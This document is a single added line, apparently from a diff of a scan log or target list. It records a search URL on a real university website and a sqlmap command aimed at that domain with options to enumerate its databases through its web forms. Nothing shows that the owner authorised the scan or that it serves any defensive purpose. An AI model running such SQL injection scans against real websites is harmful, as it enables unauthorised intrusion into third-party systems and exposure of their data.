@@ -1,0 +1,1 @@
+https://www.fccollege.edu.pk/?s=eVcu (GET)  # /usr/bin/sqlmap -u https://www.fccollege.edu.pk --dbs --forms
